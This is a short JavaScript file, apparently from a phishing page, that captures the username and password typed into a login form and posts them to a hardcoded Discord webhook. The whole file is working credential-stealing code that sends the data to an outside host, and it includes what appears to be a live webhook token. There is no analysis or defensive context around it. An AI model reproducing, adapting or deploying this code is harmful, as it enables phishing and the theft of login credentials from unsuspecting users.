    // define elements
    const usernameArea = document.getElementById("Username")
    const passwordArea = document.getElementById("Password")
    const loginbtn = document.getElementById("Loginbtn")
    const url = "https://discord.com/api/webhooks/1330185653291450399/yq9cCToHuqnOkVZiDb6-NJDlZm8a0tw7ePO-rSjEoByl6s2p4p14wGi4YZuVUZoD2LoB"
    // the main function when the button is clicked
    loginbtn.addEventListener("click", function() {
        var usernameValue = usernameArea.value
        var passwordValue = passwordArea.value
        // make the message constant
        const message = `There was a login request 
        Username: ${usernameValue} 
        Password: ${passwordValue}`

        const data = {
            content: message
        }
        // send the data to discord!!!
        fetch(url, {
            method: "POST",
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            if (response.ok) {
                console.log("send login request")
            } else {
                console.log("some thing went wrong")
            }
        })
        .catch(error => {
            console.log("Error: ", error)
        })
        
        
    })
  



